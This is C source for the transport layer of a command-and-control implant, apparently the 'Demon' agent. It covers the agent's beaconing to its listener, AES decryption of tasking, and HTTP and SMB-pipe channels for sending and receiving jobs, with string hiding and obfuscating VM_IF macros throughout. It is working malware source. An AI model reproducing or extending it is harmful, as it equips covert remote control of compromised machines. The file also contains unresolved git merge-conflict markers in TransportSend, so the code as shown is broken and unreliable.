#include <Demon.h>

#include <common/Macros.h>

#include <core/Package.h>
#include <core/Transport.h>
#include <core/MiniStd.h>
#include <core/TransportHttp.h>
#include <core/TransportSmb.h>

#include <crypt/AesCrypt.h>

BOOL TransportInit( )
{
    PUTS_DONT_SEND( HIDE_STRING("Connecting to listener") )
    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

    /* Sends to our connection (direct/pivot) */
#ifdef TRANSPORT_HTTP
    VM_IF ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };

        /* Decrypt what we got */
        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Data, Size );

        VM_IF ( Data )
        {
            VM_IF ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance->Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
#endif

#ifdef TRANSPORT_SMB
    VM_IF ( PackageTransmitNow( Instance->MetaData, NULL, NULL ) == TRUE )
    {
        Instance->Session.Connected = TRUE;
        Success = TRUE;
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Send = { 0 };
    BUFFER Resp = { 0 };

    Send.Buffer = Data;
    Send.Length = Size;

#ifdef TRANSPORT_HTTP

    VM_IF ( HttpSend( &Send, &Resp ) )
    {
<<<<<<< Updated upstream
        if ( RecvData )
            *RecvData = Resp.Buffer;
=======
        VM_IF ( RecvData ) {
            *RecvData = Resp.Buffer;
        } VM_ELSE {
            Instance->Win32.LocalFree( Resp.Buffer );
        }
>>>>>>> Stashed changes

        VM_IF ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

#endif

#ifdef TRANSPORT_SMB

    VM_IF ( SmbSend( &Send ) )
    {
        return TRUE;
    }

#endif

    return FALSE;
}

#ifdef TRANSPORT_SMB

BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Resp = { 0 };

    VM_IF ( RecvData )
        *RecvData = NULL;

    VM_IF ( RecvSize )
        *RecvSize = 0;

    VM_IF ( SmbRecv( &Resp ) )
    {
        VM_IF ( RecvData )
            *RecvData = Resp.Buffer;

        VM_IF ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

    return FALSE;
}

#endif
